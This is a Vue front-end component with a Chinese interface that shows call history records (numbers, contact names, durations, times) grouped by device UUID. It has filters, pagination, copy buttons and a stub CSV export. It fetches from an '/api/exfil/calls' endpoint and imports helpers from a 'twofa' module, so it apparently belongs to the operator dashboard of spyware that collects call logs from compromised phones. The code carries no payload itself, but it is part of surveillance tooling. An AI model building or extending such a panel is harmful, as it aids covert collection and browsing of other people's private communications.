<template>
  <div class="calls-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">通话记录</div>
        <div class="page-subtitle">设备通话历史记录</div>
      </div>
      <el-button type="danger" plain @click="exportCSV">导出 CSV</el-button>
    </div>

    <div class="search-bar">
      <el-select v-model="filters.type" placeholder="类型" clearable style="width:140px;" @change="loadList">
        <el-option label="呼入" value="in" />
        <el-option label="呼出" value="out" />
        <el-option label="未接" value="missed" />
      </el-select>
      <el-input v-model="filters.number" placeholder="搜索号码" clearable style="width:220px;" @clear="loadList" @keyup.enter="loadList" />
      <el-button type="primary" @click="loadList">搜索</el-button>
    </div>

    <el-table :data="list" stripe>
      <el-table-column prop="type" label="类型" width="100">
        <template #default="{ row }">
          <el-tag v-if="row.type === 'in' || row.type === '呼入'" type="success" size="small" effect="plain">
            <el-icon><PhoneFilled /></el-icon>呼入
          </el-tag>
          <el-tag v-else-if="row.type === 'out' || row.type === '呼出'" type="primary" size="small" effect="plain">
            <el-icon><Phone /></el-icon>呼出
          </el-tag>
          <el-tag v-else type="danger" size="small" effect="plain">
            <el-icon><Warning /></el-icon>未接
          </el-tag>
        </template>
      </el-table-column>
      <el-table-column prop="number" label="号码" width="200">
        <template #default="{ row }">
          <span class="mono">{{ row.number }}</span>
          <el-button link type="primary" size="small" @click="copy(row.number)">复制</el-button>
        </template>
      </el-table-column>
      <el-table-column prop="contact_name" label="联系人" width="140" />
      <el-table-column prop="duration" label="通话时长" width="120" />
      <el-table-column prop="device_uuid" label="归属设备" width="140">
        <template #default="{ row }">
          <span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="date" label="时间" width="180">
        <template #default="{ row }">
          <el-tooltip :content="formatDate(row.date)">
            <span class="text-muted">{{ formatRelative(row.date) }}</span>
          </el-tooltip>
        </template>
      </el-table-column>
    </el-table>

    <el-pagination
      v-model:current-page="page"
      v-model:page-size="pageSize"
      :page-sizes="[50, 100, 200, 500]"
      :total="total"
      layout="total, sizes, prev, pager, next"
      background
      @current-change="loadList"
      @size-change="loadList"
    />
  </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage } from 'element-plus'
import { Search, Phone, PhoneFilled, Warning } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, formatRelative, shortUuid, copyToClipboard } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(100)
const filters = reactive({ type: '', number: '' })

async function copy(t) {
  await copyToClipboard(t || '')
  ElMessage.success('已复制')
}

function exportCSV() { ElMessage.success('已生成 CSV 下载任务') }

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      type: filters.type || undefined,
      number: filters.number || undefined,
    }
    const res = await axios.get('/api/exfil/calls', { params })
    const raw = res.data?.items || res.data || []
    list.value = raw.map(r => ({
      ...r,
      date: r.date || r.created_at || r.uploaded_at,
      created_at: r.created_at || r.date || r.uploaded_at,
    }))
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '通话记录加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

onMounted(loadList)
</script>
